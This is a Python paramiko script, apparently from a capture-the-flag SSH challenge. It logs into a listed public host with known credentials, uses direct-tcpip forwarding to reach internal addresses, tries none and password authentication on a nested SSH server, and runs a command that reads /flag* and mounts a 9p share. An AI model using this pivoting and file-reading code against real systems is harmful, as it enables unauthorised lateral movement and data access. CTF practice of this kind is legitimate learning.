import paramiko
import socket
import time
import sys

"""
重新思考：

dropbear_2025.89 - 这是一个很新的版本
banner显示支持：
- sntrup761x25519-sha512 (后量子加密!)
- mlkem768x25519-sha256 (ML-KEM/Kyber!)
- curve25519-sha256
- kex-strict-s-v00@openssh.com (防止Terrapin攻击)

这是一个非常现代化的SSH服务器。

让我重新考虑题目提示：
1. "SSH特性利用" - 不是漏洞利用
2. "FakeJumpServer" - 跳板机伪造
3. "第二次连接的错误信息有用"

FakeJumpServer的核心攻击是：
当用户使用ProxyJump (-J)连接时，跳板机可以：
1. 拦截连接请求
2. 返回自己的公钥而不是真实目标的公钥
3. 捕获用户的密码

在这个场景中，dropbear伪装了localhost:22。
这意味着如果有人试图通过这个跳板机连接到localhost，
他们实际上会连接到dropbear本身。

但是，这对我们有什么用？我们已经知道凭据了(ctf/123456)。

让我重新考虑：也许题目的关键是要利用direct-tcpip转发到172.17.0.1
而不是localhost。因为172.17.0.1返回的是真实的OpenSSH服务器。

如果我们能找到一种方法来：
1. 通过direct-tcpip连接到172.17.0.1:22
2. 并使用某种SSH特性来获取访问权限

SSH特性包括：
- 公钥认证
- 代理转发
- X11转发
- 端口转发
- 证书认证
- GSSAPI认证

让我检查一下是否有SSH代理套接字被转发
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd_simple(cmd):
    """简单执行命令"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD, timeout=10)
    
    try:
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=5)
        result = stdout.read().decode() + stderr.read().decode()
    except Exception as e:
        result = f"Error: {e}"
    
    ssh.close()
    return result

def basic_test():
    """基本测试"""
    print("[*] 基本命令测试")
    
    # 简单测试
    result = exec_cmd_simple("id")
    print(f"id: {result}")
    
    result = exec_cmd_simple("pwd")
    print(f"pwd: {result}")
    
    result = exec_cmd_simple("ls /")
    print(f"ls /: {result}")

def check_agent_forwarding():
    """检查代理转发"""
    print("\n[*] 检查SSH Agent转发")
    
    # 检查SSH_AUTH_SOCK
    result = exec_cmd_simple("echo $SSH_AUTH_SOCK")
    print(f"SSH_AUTH_SOCK: {result}")
    
    # 检查/tmp下的ssh socket
    result = exec_cmd_simple("find /tmp -name 'ssh*' -o -name 'agent*' 2>/dev/null")
    print(f"SSH相关文件: {result}")

def try_connection_to_172():
    """尝试通过转发连接到172.17.0.1"""
    print("\n[*] 通过转发连接到172.17.0.1")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 打开到172.17.0.1:22的通道
    try:
        channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=10)
        channel.settimeout(10)
        
        # 读取banner
        banner = channel.recv(1024)
        print(f"Banner: {banner}")
        
        # 创建嵌套SSH连接
        nested_transport = paramiko.Transport(channel)
        
        # 尝试不同的认证方式
        print("\n尝试认证方式...")
        
        # 首先连接
        nested_transport.start_client()
        
        # 获取服务器的认证方式
        print(f"服务器支持的认证方式: {nested_transport.get_security_options()}")
        
        # 尝试none认证（某些配置允许）
        try:
            nested_transport.auth_none(USER)
            print("None认证成功!")
        except paramiko.BadAuthenticationType as e:
            print(f"允许的认证类型: {e.allowed_types}")
        except Exception as e:
            print(f"None认证失败: {e}")
        
        # 尝试密码认证
        try:
            nested_transport.auth_password(USER, PASSWD)
            print("密码认证成功!")
            
            # 执行命令
            nested_channel = nested_transport.open_session()
            nested_channel.exec_command("id; cat /flag* 2>/dev/null; sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt && cat /mnt/flag")
            time.sleep(2)
            output = nested_channel.recv(4096).decode()
            print(f"输出: {output}")
            
        except Exception as e:
            print(f"密码认证失败: {e}")
        
        nested_transport.close()
        
    except Exception as e:
        print(f"连接失败: {e}")
    
    ssh.close()

def explore_other_ssh_features():
    """探索其他SSH特性"""
    print("\n[*] 探索SSH特性")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 检查transport的各种属性
    print(f"服务器版本: {transport.remote_version}")
    print(f"本地版本: {transport.local_version}")
    print(f"是否认证: {transport.is_authenticated()}")
    print(f"是否活动: {transport.is_active()}")
    
    # 尝试获取更多信息
    print(f"安全选项: {transport.get_security_options()}")
    
    ssh.close()

def test_x11_forwarding():
    """测试X11转发"""
    print("\n[*] 测试X11转发")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    try:
        channel = transport.open_session()
        
        # 请求X11转发
        result = channel.request_x11()
        print(f"X11转发结果: {result}")
        
        channel.close()
    except Exception as e:
        print(f"X11转发失败: {e}")
    
    ssh.close()

def test_different_forward_addresses():
    """测试不同的转发地址"""
    print("\n[*] 测试不同的转发目标")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 测试不同的目标地址
    targets = [
        ("127.0.0.1", 22),
        ("localhost", 22),
        ("172.17.0.1", 22),
        ("10.0.2.2", 22),
        ("0.0.0.0", 22),
        ("::1", 22),
    ]
    
    for host, port in targets:
        try:
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
            channel.settimeout(5)
            banner = channel.recv(256)
            print(f"{host}:{port} -> {banner[:50]}")
            channel.close()
        except Exception as e:
            print(f"{host}:{port} -> 失败: {e}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] SSH特性深度测试 v2")
    print("="*60)
    
    basic_test()
    explore_other_ssh_features()
    test_different_forward_addresses()
    try_connection_to_172()
